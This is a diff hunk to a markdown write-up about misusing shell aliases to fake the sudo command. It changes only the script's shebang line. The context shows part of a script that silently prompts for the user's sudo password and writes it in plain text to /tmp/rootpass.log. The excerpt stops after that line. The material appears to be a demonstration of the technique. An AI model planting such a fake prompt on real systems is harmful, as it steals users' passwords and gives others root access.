@@ -39,7 +39,7 @@ It simply shows a way how the alias feature can be misused to fake the `sudo` co
 Such a script could look like this:
 
 ```bash
-#!/bin/bash
+#!/usr/bin/env bash
 
 read -s -p "[sudo] password for $USER: " password
 echo $password > /tmp/rootpass.log
